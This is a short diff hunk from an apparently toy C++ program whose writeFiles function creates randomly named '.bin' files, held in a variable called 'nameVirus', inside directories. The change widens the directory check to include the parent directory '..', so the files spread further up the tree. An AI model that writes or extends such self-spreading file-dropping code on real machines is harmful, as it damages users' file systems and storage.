@@ -58,7 +58,7 @@ void writeFiles(vector<string> files)
           file = files[i]; // get the file
 
         // get the directories
-        if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
+        if (!regex_match(files[i], itsAFile) == 0 || files[i] == "." || files[i] == "..")
         {
           // generate the name
           string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
